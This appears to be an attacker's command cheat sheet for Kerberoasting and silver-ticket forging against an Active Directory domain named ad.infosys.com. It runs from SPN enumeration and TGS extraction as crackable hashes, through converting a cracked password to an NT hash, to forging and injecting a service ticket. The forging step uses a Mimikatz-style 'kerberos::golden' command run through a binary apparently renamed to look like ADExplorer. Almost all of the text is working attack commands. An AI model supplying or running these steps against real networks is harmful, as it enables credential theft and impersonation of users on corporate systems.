REM Get SPNs
setspn -T ad.infosys.com -Q */*


REM Request a TGS
cd ./Powersploit/Recon/
Powershell
Import-Module .\PowerView.ps1
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN name>'

REM Check for requested TGS from memory
klist


REM Extract TGS from memory as hash
REM Admin is required
Import-Module Get-TGSCipher.ps1
Get-TGSCipher -SPN "<SPN name>" -Format John


REM Silver ticker forging
REM Get SID of the user
whomai /user


REM Convert cracked password to NT hash
cd ./DSInternals
powershell
Import-module .\DSInternals.psd1
$pwd = ConvertTo-SecureString -String '<plain password>' -AsPlainText -Force
ConvertTo-NTHash -Password $pwd




REM Forge TSG and inject into memory
ADExplorer_sgned.exe "kerberos::golden /sid:<SID> /domain:ad.infosys.com /ptt /id:1155 /target:<Service hostname> /service:http /rc4:<NT hash> /user:anyusernamefortesting"

REM List the TGS
ADExplorer_sgned.exe "kerberos::list"


REM Testing
Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://server-host-name.domain


